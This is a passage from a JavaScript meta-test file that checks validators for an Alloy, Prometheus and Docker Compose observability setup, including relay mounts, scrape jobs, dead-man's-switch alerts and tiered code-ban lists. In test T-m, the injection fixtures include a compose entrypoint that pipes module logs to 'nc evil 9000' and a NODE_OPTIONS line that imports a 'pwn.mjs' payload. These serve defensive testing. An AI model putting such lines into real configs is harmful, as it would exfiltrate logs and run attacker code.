        if (checkAlloyRunsUnprivileged(alloyCompose({ extraLines })).ok) {
          return `\`${key}\` was accepted on an otherwise-compliant alloy block — it hands back what cap_drop just took away`;
        }
      }
      return null;
    },
  },
  {
    id: 'T-l',
    // Kills a file-wide substring check for the pinned statements (AM20: the
    // same text in an unwired component bounds nothing), a grammar widening,
    // AND a 40-hex narrowing — the tooth that stops a future author applying the
    // original slice brief's instruction, which would drop build_sha from 100%
    // of production datapoints.
    run() {
      const good = checkBuildShaBounded(alloyS4Fixture());
      if (!good.ok) return `the committed s4_keep shape was rejected: ${good.detail}`;

      const widened = checkBuildShaBounded(
        alloyS4Fixture({
          statements: [
            S4_STATEMENT_KEEP_KEYS,
            S4_STATEMENT_ZONE_ID,
            BUILD_SHA_WIDENED,
            S4_STATEMENT_DEVICE_CLASS,
          ],
        }),
      );
      if (widened.ok) return 'the build_sha grammar WIDENED to {1,40} was accepted';

      const narrowed = checkBuildShaBounded(
        alloyS4Fixture({
          statements: [
            S4_STATEMENT_KEEP_KEYS,
            S4_STATEMENT_ZONE_ID,
            BUILD_SHA_NARROWED,
            S4_STATEMENT_DEVICE_CLASS,
          ],
        }),
      );
      if (narrowed.ok) {
        return 'the build_sha grammar NARROWED to {40} was accepted — the client emits 7 hex chars, so that drops the attribute from every datapoint';
      }
      for (const needle of ['7-character', 'attributes.ts', 'names.ts']) {
        if (!narrowed.detail.includes(needle)) {
          return `the {40} failure does not tell the next reader why 40 is wrong (missing \`${needle}\`): ${narrowed.detail}`;
        }
      }

      const reordered = checkBuildShaBounded(
        alloyS4Fixture({
          statements: [
            S4_STATEMENT_ZONE_ID,
            S4_STATEMENT_KEEP_KEYS,
            S4_STATEMENT_BUILD_SHA,
            S4_STATEMENT_DEVICE_CLASS,
          ],
        }),
      );
      if (reordered.ok) return '`keep_matching_keys` demoted out of element [0] was accepted';

      const commented = alloyS4Fixture({
        statements: [S4_STATEMENT_KEEP_KEYS, S4_STATEMENT_ZONE_ID, S4_STATEMENT_DEVICE_CLASS],
        commentedStatements: [S4_STATEMENT_BUILD_SHA],
      });
      if (!commented.includes(S4_STATEMENT_BUILD_SHA)) {
        return 'FIXTURE: the commented-out case must still spell the statement verbatim';
      }
      if (checkBuildShaBounded(commented).ok) {
        return 'a build_sha bound demoted to a `//` comment was accepted';
      }

      // AM20: both statements moved VERBATIM into a second, unwired component.
      // A file-wide check is green; s4_keep's effective list has lost the bound.
      const parked = alloyS4Fixture({
        statements: [S4_STATEMENT_KEEP_KEYS, S4_STATEMENT_ZONE_ID, S4_STATEMENT_DEVICE_CLASS],
        parkedComponent: true,
      });
      if (!parked.includes(S4_STATEMENT_BUILD_SHA) || !parked.includes(S4_STATEMENT_KEEP_KEYS)) {
        return 'FIXTURE: the parked-component case must still spell both statements verbatim';
      }
      const moved = checkBuildShaBounded(parked);
      if (moved.ok) {
        return 'the pinned statements moved into an unwired `parked_bounds` component were accepted — the live pipeline has lost the bound';
      }
      if (!moved.detail.includes('ABSENT from THIS list')) {
        return `the moved-statement failure does not say the bound left s4_keep's own list: ${moved.detail}`;
      }

      if (checkBuildShaBounded('otelcol.exporter.prometheus "s4" {\n}\n').ok) {
        return 'an alloy config with NO s4_keep component was accepted';
      }
      if (
        checkBuildShaBounded('otelcol.processor.transform "s4_keep" {\n\toutput {\n\t}\n}\n').ok
      ) {
        return 'an s4_keep with no `metric_statements` block was accepted';
      }
      if (checkBuildShaBounded(alloyS4Fixture({ statements: [] })).ok) {
        return 'an EMPTY statements list was accepted — the S4 label bounds would be gone';
      }
      return null;
    },
  },
  {
    id: 'T-m',
    // G9n. Kills: a mount check that accepts the relay having NO mount at all
    // (which C5 does — its only floor is `found === 0`); one that accepts `:rw`
    // or a bare mount; one that accepts a DIFFERENT host path holding a copy of
    // the same files; one that never ties the mount to the code path that reads
    // it; and the whole injection surface C3/C5/C6/C7/C17 miss on this service,
    // where a PoC'd block with an `entrypoint:`, an `env_file:`, NODE_OPTIONS,
    // NODE_USE_ENV_PROXY, an HTTPS_PROXY carrying credentials and an
    // MR_RELAY_KEY passed all five.
    run() {
      const good = checkRelayMountMirrorsAlloy(relayCompose());
      if (!good.ok) return `the committed relay block was rejected: ${good.detail}`;

      // AM1, pinned in BOTH directions. The container target must not contain
      // `replicas`, because C5 reads any `- ...replicas...` line — INCLUDING a
      // `command:` item — as a mount and requires it to end `:ro`.
      const c5 = checkModuleLogsMountReadOnly(relayCompose());
      if (!c5.ok) {
        return `AM1: the committed relay shape REDS C5 (checkModuleLogsMountReadOnly): ${c5.detail}. The container target and the --logs-dir value must not contain the substring 'replicas'.`;
      }
      const am1 = checkModuleLogsMountReadOnly(
        relayCompose({ mountTarget: '/data/replicas', logsDir: '/data/replicas' }),
      );
      if (am1.ok) {
        return 'AM1: a `- --logs-dir=/data/replicas` command item did NOT red C5 — the fixture no longer demonstrates the unbuildable shape FIXTURE_MOUNT_TARGET exists to avoid, so the comment above it has become a story rather than a fact';
      }

      if (checkRelayMountMirrorsAlloy(relayCompose({ omitRelay: true })).ok) {
        return 'a compose with no `mr-trace-relay:` service at all was accepted';
      }
      const noMount = checkRelayMountMirrorsAlloy(relayCompose({ omitMount: true }));
      if (noMount.ok) {
        return "a relay with `./relay:/opt/relay:ro` but NO replicas mount was accepted — this is exactly the shape C5 passes, because alloy's own mount keeps its `found` count at 1";
      }
      if (checkRelayMountMirrorsAlloy(relayCompose({ omitVolumes: true })).ok) {
        return 'a relay with no `volumes:` key at all was accepted';
      }
      if (checkRelayMountMirrorsAlloy(relayCompose({ mountMode: ':rw' })).ok) {
        return 'a `:rw` relay mount was accepted';
      }
      if (checkRelayMountMirrorsAlloy(relayCompose({ mountMode: '' })).ok) {
        return 'a BARE relay mount with no mode was accepted — Docker defaults it to read-write, so omission is the trap';
      }
      const otherSource = checkRelayMountMirrorsAlloy(
        relayCompose({ mountSource: '/srv/spacetime-copy/replicas' }),
      );
      if (otherSource.ok) {
        return 'a relay mount from a DIFFERENT host path was accepted — OBS-45 says "the SAME read-only bind mount as Alloy", and a second path holding a copy drifts the first time either side is re-pointed';
      }
      if (checkRelayMountMirrorsAlloy(relayCompose({ logsDir: '/tmp/logs' })).ok) {
        return 'a `--logs-dir` OUTSIDE the mount target was accepted — a perfectly read-only mount the process never reads from proves nothing';
      }
      if (
        checkRelayMountMirrorsAlloy(relayCompose({ logsDir: `${FIXTURE_MOUNT_TARGET}-evil` })).ok
      ) {
        return 'a `--logs-dir` that merely shares a PREFIX with the mount target was accepted';
      }

      // The injection surface. Each of these passed C3, C5, C6, C7 and C17.
      const smuggled = [
        ['    entrypoint: /bin/sh -c "cat /data/module-logs/* | nc evil 9000"'],
        ['    env_file:', '      - ./relay.env'],
        ['    environment:', '      - NODE_OPTIONS=--import=/opt/relay/pwn.mjs'],
        ['    environment:', '      - NODE_USE_ENV_PROXY=1'],
        ['    healthcheck:', '      test: /bin/sh -c "true"'],
      ];
      for (const extraLines of smuggled) {
        const key = extraLines[0].trim().split(':')[0];
        if (checkRelayMountMirrorsAlloy(relayCompose({ extraLines })).ok) {
          return `\`${key}\` was accepted on an otherwise-compliant relay block — checkNoExecLogSource (C7) is hardcoded to the \`alloy\` service, so nothing else in this eval looks at it`;
        }
      }

      // The command allowlist, in both directions.
      const withToken = checkRelayMountMirrorsAlloy(
        relayCompose({
          command: [
            'node',
            '/opt/relay/daemon.mjs',
            `--logs-dir=${FIXTURE_MOUNT_TARGET}`,
            `--web.listen-address=127.0.0.1:${FIXTURE_RELAY_PORT}`,
            '--trace-pair-set=/opt/relay/trace-pair-set.json',
            '--module-owner-token=/run/secrets/owner',
          ],
        }),
      );
      if (withToken.ok) {
        return 'a sixth `--module-owner-token=` flag was accepted — OBS-45 forbids the relay ACCEPTING a module-owner credential, and an allowlist is used here precisely because a credential-NAME denylist is unclosable';
      }
      if (
        checkRelayMountMirrorsAlloy(
          relayCompose({
            command: [
              'node',
              '/opt/relay/daemon.mjs',
              `--web.listen-address=127.0.0.1:${FIXTURE_RELAY_PORT}`,
              '--trace-pair-set=/opt/relay/trace-pair-set.json',
            ],
          }),
        ).ok
      ) {
        return 'a command MISSING `--logs-dir` was accepted';
      }
      const bareFirst = checkRelayMountMirrorsAlloy(
        relayCompose({
          command: [
            `--logs-dir=${FIXTURE_MOUNT_TARGET}`,
            `--web.listen-address=127.0.0.1:${FIXTURE_RELAY_PORT}`,
            '--trace-pair-set=/opt/relay/trace-pair-set.json',
          ],
        }),
      );
      if (bareFirst.ok) {
        return 'a command whose FIRST item is a flag was accepted — the node:*-alpine entrypoint only prepends `node` when $1 does not start with `-`, so this container dies on start (AM5)';
      }
      if (checkRelayMountMirrorsAlloy(relayCompose({ omitCommand: true })).ok) {
        return 'a relay service with NO `command:` was accepted — the node image default is a REPL';
      }
      return null;
    },
  },
  {
    id: 'T-n',
    // G9o. Kills: a flat `job_name: mr-trace-relay` line scan (the decoy sits
    // under a top-level key Prometheus never reads); a job with no
    // `metrics_path:` (which silently scrapes /metrics and 404s); and — the
    // tooth that matters most — a port comparison that reads the listen flag
    // file-wide instead of from the relay's own block, which returns
    // PROMETHEUS's 9090.
    run() {
      const compose = relayCompose();
      const good = checkRelayScrapeJobWired(relayPrometheus(), compose);
      if (!good.ok) return `the committed scrape job was rejected: ${good.detail}`;

      // FIXTURE INTEGRITY: the trap must actually be present, or every clause
      // below passes for the wrong reason.
      const flag = '--web.listen-address=';
      const firstAt = compose.indexOf(flag);
      if (firstAt === -1) return 'FIXTURE: the compose must declare a listen flag at all';
      const firstBind = compose
        .slice(firstAt + flag.length)
        .split('\n')[0]
        .trim();
      if (firstBind !== '127.0.0.1:9090') {
        return `FIXTURE: the FIRST \`${flag}\` occurrence must be prometheus's 9090 (it is \`${firstBind}\`), otherwise the file-wide-indexOf bug this tooth exists to catch is invisible`;
      }
      if (FIXTURE_RELAY_PORT === 9090) {
        return 'FIXTURE: the relay port must differ from 9090, or a detector reading the wrong flag agrees by coincidence';
      }
      const wrong9090 = checkRelayScrapeJobWired(relayPrometheus({ port: 9090 }), compose);
      if (wrong9090.ok) {
        return "a scrape target on 9090 was accepted — that is prometheus's OWN port and precisely what a file-wide `indexOf('--web.listen-address=')` returns, so this is the bug rather than a hypothetical";
      }

      if (checkRelayScrapeJobWired(relayPrometheus({ omitJob: true }), compose).ok) {
        return 'a prometheus.yml with NO relay job was accepted — this is the pre-13r-b tree';
      }
      const noPath = checkRelayScrapeJobWired(relayPrometheus({ omitMetricsPath: true }), compose);
      if (noPath.ok) {
        return "a relay job with NO `metrics_path:` was accepted — Prometheus silently defaults to /metrics, the scrape 404s, `up` goes to 0 and the dead-man's switch sits permanently firing";
      }
      if (!noPath.detail.includes('/metrics')) {
        return `the missing-metrics_path failure does not name the silent default: ${noPath.detail}`;
      }
      if (checkRelayScrapeJobWired(relayPrometheus({ metricsPath: '/metrics' }), compose).ok) {
        return 'a relay job scraping `/metrics` was accepted — the daemon serves /health';
      }
      if (checkRelayScrapeJobWired(relayPrometheus({ port: 9999 }), compose).ok) {
        return "a scrape target whose port is not the relay's compose bind port was accepted — co-occurrence is not wiring";
      }
      if (checkRelayScrapeJobWired(relayPrometheus({ host: '0.0.0.0' }), compose).ok) {
        return 'a non-loopback scrape target host was accepted';
      }

      // AM12's decoy: a structurally PERFECT job under `x-parked:`.
      const decoyText = relayPrometheus({ decoy: true });
      if (!decoyText.includes(`job_name: ${RELAY_SERVICE_NAME}`)) {
        return 'FIXTURE: the decoy must still spell the job name verbatim';
      }
      if (decoyText.indexOf('x-parked:') > decoyText.indexOf('scrape_configs:')) {
        return 'FIXTURE: the decoy must sit BEFORE `scrape_configs:` to shadow a first-match search';
      }
      const decoy = checkRelayScrapeJobWired(decoyText, compose);
      if (decoy.ok) {
        return 'a relay job declared under a top-level `x-parked:` key was accepted — Prometheus never scrapes it, so a flat line scan calls a dead target wired';
      }
      if (!decoy.detail.includes('scrape_configs')) {
        return `the decoy failure does not say where the job must live: ${decoy.detail}`;
      }

      if (checkRelayScrapeJobWired(relayPrometheus(), relayCompose({ omitRelay: true })).ok) {
        return "a scrape job for a service that does not exist in the compose was accepted — that is the permanently-zero dead-man's switch the m20e-2 park existed to prevent";
      }
      if (checkRelayScrapeJobWired('global:\n  scrape_interval: 15s\n', compose).ok) {
        return 'a prometheus.yml with no `scrape_configs:` key at all was accepted';
      }
      return null;
    },
  },
  {
    id: 'T-o',
    // G9p. Kills every shape that satisfies "an alert rule mentions the relay"
    // while never firing: a `gt` evaluator, `isPaused: true`, a dangling
    // `condition:` refId, a threshold over the wrong refId, a wrong datasource,
    // a `for:` that is not OBS-39's, a coarser group interval, a missing
    // severity label. AND the two shapes the spec names as unbuildable: OBS-39's
    // own rule widened with `or`, and a new rule watching both processes.
    run() {
      const good = checkRelayDeadMansSwitch(deadMansRulesDoc());
      if (!good.ok) return `the committed dead-man's-switch shape was rejected: ${good.detail}`;

      // FIXTURE INTEGRITY: three rules, three DIFFERENT `for:` values, with
      // AlloyIngestStalled's 10m sitting between AlloyDown and the relay rule.
      const doc = deadMansRulesDoc();
      for (const needle of ['for: 60s', 'for: 10m']) {
        if (!doc.includes(needle)) {
          return `FIXTURE: the document must carry \`${needle}\` so a forward-scanning detector is caught`;
        }
      }
      if (doc.indexOf('for: 10m') < doc.indexOf(ALLOY_UP_NEEDLE)) {
        return "FIXTURE: AlloyIngestStalled's 10m must sit AFTER AlloyDown's expr, or the scan-direction trap is not armed";
      }

      // The spec's named-unbuildable shape #1: OBS-39's OWN rule widened.
      const widened = checkRelayDeadMansSwitch(
        deadMansRulesDoc({
          alloyExpr: `${ALLOY_UP_NEEDLE} or ${RELAY_UP_NEEDLE}`,
          omitRelayRule: true,
        }),
      );
      if (widened.ok) {
        return 'AlloyDown\'s own expr widened with `or up{job="mr-trace-relay"}` was accepted — spec:542-547 calls folding the relay into OBS-39\'s rule unbuildable, because Alloy keeps running fine when the relay dies';
      }
      if (!widened.detail.includes('UNBUILDABLE')) {
        return `the widened-rule failure does not say why one rule cannot watch two processes: ${widened.detail}`;
      }
      // Shape #2: a NEW uid whose expr still covers both processes.
      const bothJobs = checkRelayDeadMansSwitch(
        deadMansRulesDoc({ relayExpr: `${ALLOY_UP_NEEDLE} or ${RELAY_UP_NEEDLE}` }),
      );
      if (bothJobs.ok) {
        return 'a distinct-uid rule whose expr matches BOTH job="alloy" and job="mr-trace-relay" was accepted — a fresh uid is not a distinct rule if the expression is not distinct';
      }

      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ omitRelayRule: true })).ok) {
        return 'a rules.yml with no relay rule at all was accepted — this is the pre-13r-b tree';
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayEvaluatorType: 'gt' })).ok) {
        return 'a `gt` evaluator was accepted — `up` is 1 when the target is healthy, so `gt 1` NEVER fires while the expr, the uid, the for: and the datasource all stay correct';
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayParams: ['0'] })).ok) {
        return 'an evaluator threshold of `0` was accepted — `up` is never below 0, so the switch cannot fire';
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayThresholdType: 'reduce' })).ok) {
        return 'a condition node that is not a `threshold` was accepted';
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayPaused: 'true' })).ok) {
        return '`isPaused: true` was accepted — a paused rule is provisioned, visible, and never evaluated';
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayPaused: 'false' })).ok !== true) {
        return 'an explicit `isPaused: false` was rejected, but it is legal and equivalent to omitting the key';
      }
      const dangling = checkRelayDeadMansSwitch(deadMansRulesDoc({ relayCondition: 'Z' }));
      if (dangling.ok) {
        return 'a `condition:` naming a refId no `data:` entry declares was accepted — the quietest failure in this file: right expr, right threshold, never fires';
      }
      if (!dangling.detail.includes('DANGLING')) {
        return `the dangling-refId failure does not name the mechanism: ${dangling.detail}`;
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayExpression: 'B' })).ok) {
        return 'a threshold node applied to a refId that is NOT the one carrying the relay expr was accepted — the switch would be watching a different query entirely';
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayDatasourceUid: 'mr-loki' })).ok) {
        return '`up` queried against a non-Prometheus datasource was accepted — the query returns No Data forever, which Grafana does not render as an alert';
      }

      // The `for:` mirror, in the direction a scan-direction bug gets wrong.
      const forTenM = checkRelayDeadMansSwitch(deadMansRulesDoc({ relayFor: '10m' }));
      if (forTenM.ok) {
        return "a relay `for: 10m` was accepted — 10m is AlloyIngestStalled's value, i.e. exactly what a detector that finds AlloyDown by its expr and then scans FORWARD for a `for:` would compare against";
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayFor: '20s' })).ok) {
        return "a relay `for: 20s` was accepted — OBS-46 defines its threshold by reference to OBS-39's, and this is a mirror, not a lower bound";
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayFor: '24h' })).ok) {
        return 'a relay `for: 24h` was accepted — a `>=` comparison passes it, which is why the check is EQUALITY';
      }

      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayUid: 'mr-alloy-down' })).ok) {
        return "a relay rule REUSING AlloyDown's uid was accepted — Grafana keys provisioned rules by uid, so one silently replaces the other";
      }
      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relaySeverity: 'warning' })).ok) {
        return "a relay rule whose `severity:` does not mirror AlloyDown's was accepted (AM19) — notification-policies.yml:8-9 routes on it, so the rule silently takes the catch-all 4h repeat interval";
      }

      const coarser = checkRelayDeadMansSwitch(
        deadMansRulesDoc({ relayInSecondGroup: true, relayGroupInterval: '60s' }),
      );
      if (coarser.ok) {
        return "the relay rule in a group with a COARSER interval than AlloyDown's was accepted — Grafana transitions state only on an evaluation boundary, so the effective pending period stretches past the `for:` both rules agree on";
      }
      if (
        !checkRelayDeadMansSwitch(
          deadMansRulesDoc({ relayInSecondGroup: true, relayGroupInterval: '20s' }),
        ).ok
      ) {
        return 'the relay rule in a SEPARATE group with an EQUAL interval was rejected — that is legal, and rejecting it would force an unrelated layout decision';
      }
      return null;
    },
  },
  {
    id: 'T-p',
    // G9j's three ban tiers + G9i's production surface. Kills: a global
    // relaxation of HYGIENE_BANS (the one edit that keeps `just ci` green while
    // making the live gate vacuous); a two-tier split that lets daemon.test.mjs
    // open a real listener; a filename-keyed tier map that FAILS OPEN for an
    // unclassified file; and AM7's executed write cheat, which scanned GREEN
    // through every previously-proposed gate.
    run() {
      // 1. The tier tables and the file lists must not have drifted apart. This
      //    is a STATIC assertion about this file, and it is the one that stops
      //    the hand-edited lists silently disagreeing.
      const declared = [...RELAY_PRODUCTION_FILES, ...RELAY_TEST_FILES];
      for (const name of declared) {
        const tiers = RELAY_BAN_TIERS.filter((t) => t.files.includes(name));
        if (tiers.length !== 1) {
          return `the declared relay file \`${name}\` resolves to ${tiers.length} ban tiers [${tiers.map((t) => t.id).join(', ') || 'none'}] — the tier tables and the file lists have drifted, and an unclassified file gets NO bans applied`;
        }
      }
      for (const tier of RELAY_BAN_TIERS) {
        for (const name of tier.files) {
          if (!declared.includes(name)) {
            return `the \`${tier.id}\` tier lists \`${name}\`, which is in neither RELAY_PRODUCTION_FILES nor RELAY_TEST_FILES`;
          }
        }
      }

      // 2. The retier KEPT what it was supposed to keep.
      for (const kept of ['date.now(', 'node:child_process', 'node:net', `new reg${'exp('}`]) {
        if (!DAEMON_BANS.includes(kept)) {
          return `the DAEMON tier no longer bans \`${kept}\`. AM16(b) CUT the \`now\` seam precisely so date.now( could stay banned in every tier — the daemon reads no wall-clock time (pairing uses the host \`ts\` per OBS-43, cadence uses the timer, /health's counter is monotonic). Relaxing these is how this gate goes vacuous.`;
        }
      }
      for (const relaxed of DAEMON_RELAXED_BANS) {
        if (DAEMON_BANS.includes(relaxed)) {
          return `the DAEMON tier still bans \`${relaxed}\`, which the daemon genuinely needs — this tooth exists to keep the relaxation MINIMAL, not to make it impossible`;
        }
      }
      const daemonTest = RELAY_BAN_TIERS.find((t) => t.id === 'daemon-test');
      for (const ban of HYGIENE_BANS) {
        if (!daemonTest.bans.includes(ban)) {
          return `the DAEMON-TEST tier dropped \`${ban}\`. It drives INJECTED transports and needs none of the relaxations; keeping all ${HYGIENE_BANS.length} bans is what mechanically forces the injected seam and stops a real listener on a fixed port appearing under \`node --test\`'s parallel execution.`;
        }
      }
      for (const egress of DAEMON_EGRESS_BANS) {
        if (!DAEMON_BANS.includes(egress)) {
          return `the DAEMON tier no longer bans \`${egress}\` — that is the P5 tripwire, and dropping a needle is not the same as graduating the park`;
        }
      }

      // 3. The good shapes are ACCEPTED, one per tier.
      const goodFiles = [
        { name: 'parse.mjs', source: PURE_GOOD },
        { name: 'tail.mjs', source: PURE_GOOD },
        { name: 'tail.test.mjs', source: PURE_GOOD },
        { name: RELAY_BATCH_CLI_FILE, source: BATCH_CLI_GOOD },
        { name: RELAY_DAEMON_FILE, source: DAEMON_GOOD },
        { name: RELAY_DAEMON_TEST_FILE, source: DAEMON_TEST_GOOD },
      ];
      const good = checkRelayBanTiers(goodFiles);
      if (!good.ok) return `the expected per-tier shapes were rejected: ${good.detail}`;
      if (checkRelayBanTiers([]).ok) {
        return 'an EMPTY relay file list was accepted — a scan of nothing passes everything';
      }

      const one = (name, source) => checkRelayBanTiers([{ name, source }]);

      // 4. PURE tier keeps all 8.
      if (one('tail.mjs', PURE_WITH_NODE_HTTP).ok) {
        return 'a PURE-tier file importing `node:http` was accepted — the retier relaxes that needle for daemon.mjs ONLY, and a pure core that can open a socket is not a pure core';
      }
      if (one('parse.mjs', `${PURE_GOOD}\nsetInterval(tick, 10);`).ok) {
        return 'a PURE-tier file calling setInterval was accepted';
      }
      if (one('parse.test.mjs', PURE_WITH_NODE_HTTP).ok) {
        return 'a PURE-tier TEST file importing `node:http` was accepted — AM12 scopes the bans to relay/**, tests included';
      }

      // 5. DAEMON tier: relaxed exactly four needles, and nothing else.
      const cheats = [
        [DAEMON_WITH_CHILD_PROCESS, 'node:child_process'],
        [DAEMON_WITH_DYNAMIC_REGEXP, 'the dynamic-regexp constructor'],
        [DAEMON_WITH_DATE_NOW, 'Date.now('],
      ];
      for (const [source, label] of cheats) {
        if (one(RELAY_DAEMON_FILE, source).ok) {
          return `a daemon containing ${label} was accepted — the DAEMON tier relaxes only [${DAEMON_RELAXED_BANS.join(', ')}]`;
        }
      }
      const egressCheats = [
        [DAEMON_WITH_FETCH, 'fetch('],
        [DAEMON_WITH_REQUEST, '.request('],
        [DAEMON_WITH_UNDICI, 'undici'],
      ];
      for (const [source, label] of egressCheats) {
        const result = one(RELAY_DAEMON_FILE, source);
        if (result.ok) {
          return `a daemon containing \`${label}\` was accepted — the OTLP POST client is PARKED to the P5-otlp-export follow-up slice, so the daemon has ZERO egress and this ban is flat`;
        }
        if (!result.detail.includes('P5')) {
          return `the egress failure for \`${label}\` does not name the P5 park it is the tripwire for: ${result.detail}`;
        }
      }
      const twoTimers = one(RELAY_DAEMON_FILE, DAEMON_WITH_TWO_TIMERS);
      if (twoTimers.ok) {
        return 'a daemon with TWO timer call sites was accepted — the relaxation exists for the single poll loop, and a second independent cadence is a second unreviewed behaviour';
      }
      if (one(RELAY_DAEMON_FILE, DAEMON_NO_READ.replace('setInterval', 'queueTick')).ok) {
        return 'a daemon with ZERO timer call sites was accepted — the poll loop either does not exist or hides behind an unreviewed construct';
      }

      // 6. DAEMON-TEST tier keeps all 8 — this is what forces the injected seam.
      const testListen = one(RELAY_DAEMON_TEST_FILE, DAEMON_TEST_WITH_LISTEN);
      if (testListen.ok) {
        return "a `daemon.test.mjs` containing `.listen(` was accepted — a real listener on a fixed port under `node --test`'s parallel execution is this repo's recorded global-lock flake class, and the ban is what forces the transport to be injected";
      }
      if (one(RELAY_DAEMON_TEST_FILE, `${DAEMON_TEST_GOOD}\nconst t = Date.now();`).ok) {
        return 'a `daemon.test.mjs` reading the wall clock was accepted — the clock is injected';
      }

      // 7. The unclassified file: the FAIL-OPEN hole a filename-keyed map has.
      const stray = checkRelayBanTiers([{ name: 'helper.mjs', source: PURE_WITH_NODE_HTTP }]);
      if (stray.ok) {
        return 'a relay .mjs in NEITHER tier was accepted — a filename-keyed tier map applies no bans at all to it, so an unlisted file is an unscanned file';
      }
      if (!stray.detail.includes('FAILS OPEN')) {
        return `the unclassified-file failure does not explain the fail-open mechanism: ${stray.detail}`;
      }
      if (checkRelayBanTiers([{ name: 'fixtures/decoy.mjs', source: PURE_GOOD }]).ok) {
        return 'a .mjs under `relay/fixtures/` was accepted — the directory walk is recursive precisely so a subdirectory is not an unscanned hiding place';
      }

      // 8. G9i's production surface, over the SAME helper the gate calls.
      const clean = relayProductionProblems(RELAY_DAEMON_FILE, DAEMON_GOOD);
      if (clean.length !== 0) {
        return `the clean daemon shape was flagged by the production scan: ${clean.join(' || ')}`;
      }
      if (relayProductionProblems(RELAY_BATCH_CLI_FILE, BATCH_CLI_GOOD).length !== 0) {
        return 'the clean batch-CLI shape was flagged by the production scan';
      }
      if (relayProductionProblems('parse.mjs', PURE_GOOD).length !== 0) {
        return 'the clean pure-core shape was flagged by the production scan';
      }
      const surfaceCheats = [
        [
          DAEMON_WITH_OPEN_WRITE,
          'a promise-API write (`await open(p, "a").write(doc)`) — AM7\'s executed cheat, which scanned GREEN because WRITE_APIS held `opensync` but not `open(`',
        ],
        [
          DAEMON_WITH_CP_SYNC,
          "a bulk `cpSync(...)` copy of the log tree — the other half of AM7's cheat",
        ],
        [DAEMON_WITH_WILDCARD_BIND, 'a `0.0.0.0` wildcard bind literal'],
        [
          DAEMON_WITH_SCHEME,
          'a `://` scheme literal, which the remote-only Semgrep raw-URL rule matches and local `just ci` cannot catch',
        ],
        [DAEMON_WITH_CREDENTIAL, 'a credential-shaped env read'],
        [
          DAEMON_NO_READ,
          'a shell that never calls a read API, so it cannot be confirmed to read READ-ONLY',
        ],
      ];
      for (const [source, label] of surfaceCheats) {
        if (relayProductionProblems(RELAY_DAEMON_FILE, source).length === 0) {
          return `the production scan reported ${label} as clean`;
        }
      }
      if (relayProductionProblems('tail.mjs', PURE_WITH_NODE_FS).length === 0) {
        return 'a PURE-tier production file importing `node:fs` was reported clean — the pure core takes text in and returns data out';
      }
      return null;
    },
  },
  {
    id: 'T-q',
    // G13a. Kills: `function=~` swapped for `reducer=~` (PromQL silently
    // matches nothing on a non-existent label, recording an EMPTY series
    // forever); a fifth name added or one of the four removed; the two
    // selectors carrying DIFFERENT name sets; `sum by (le)` with no
    // `function`; the whole rule commented out; and the ratio rule inlining
    // its own `function=~` matcher.
    run() {
      const good = checkSchedulerRecordingRules(schedulerRecordingDoc());
      if (!good.ok) return `the committed mr-scheduler shape was rejected: ${good.detail}`;

      if (
        checkSchedulerRecordingRules(schedulerRecordingDoc({ starts: { labelKey: 'reducer' } })).ok
      ) {
        return '`function=~` swapped for `reducer=~` on the starts selector was accepted — PromQL silently matches NOTHING on a non-existent label key';
      }
      if (
        checkSchedulerRecordingRules(schedulerRecordingDoc({ onTime: { labelKey: 'reducer' } })).ok
      ) {
        return '`function=~` swapped for `reducer=~` on the on-time selector was accepted';
      }

      const fifthName = [...SCHEDULED_FN_NAMES, 'battle_matchmaker'];
      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ starts: { names: fifthName } })).ok) {
        return 'a FIFTH function name added to the starts selector was accepted — set equality, never a count';
      }
      const threeOfFour = SCHEDULED_FN_NAMES.slice(0, 3);
      if (
        checkSchedulerRecordingRules(schedulerRecordingDoc({ onTime: { names: threeOfFour } })).ok
      ) {
        return 'ONE of the four function names removed from the on-time selector was accepted';
      }

      // The two selectors carrying DIFFERENT (but same-LENGTH) sets: neither
      // count-only nor "matches the expected set" alone proves this clause,
      // since a mutation that also drifts from the canonical 4 is caught
      // earlier — this fixture keeps 4 names on the on-time side, one of
      // which is not in the canonical set, so it disagrees with BOTH the
      // starts selector and the expected allowlist.
      const swapped = [...SCHEDULED_FN_NAMES.slice(0, 3), 'battle_matchmaker'];
      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ onTime: { names: swapped } })).ok) {
        return 'the numerator and denominator selectors carrying DIFFERENT function sets was accepted';
      }

      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ starts: { aggBy: 'le' } })).ok) {
        return '`sum by (le)` with no `function` grouping was accepted on the starts selector';
      }
      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ onTime: { aggBy: 'le' } })).ok) {
        return '`sum by (le)` with no `function` grouping was accepted on the on-time selector';
      }

      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ starts: { comment: true } })).ok) {
        return 'the whole starts rule commented out was accepted';
      }

      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ ratio: { extraMatcher: true } })).ok) {
        return 'the ratio rule inlining its own `function=~` matcher was accepted — the allowlist must appear exactly twice in the file, never restated a third time';
      }

      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ starts: { omit: true } })).ok) {
        return 'a document with no starts (le="+Inf") selector at all was accepted';
      }
      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ onTime: { omit: true } })).ok) {
        return 'a document with no on-time (le="0.05") selector at all was accepted';
      }
      if (checkSchedulerRecordingRules(schedulerRecordingDoc({ ratio: { omit: true } })).ok) {
        return 'a document with no ratio rule at all was accepted';
      }
      if (checkSchedulerRecordingRules('groups: []\n').ok) {
        return 'a recording.rules.yml with zero groups was accepted';
      }
      return null;
    },
  },
  {
    id: 'T-r',
    // G13b. Kills: an empty `expr`; a `gridPos` overlapping another panel; a
    // duplicate `id`; `legendFormat` missing `{{function}}`; a non-percentunit
    // `unit`; and a panel threshold that disagrees with the alert's own
    // evaluator param.
    run() {
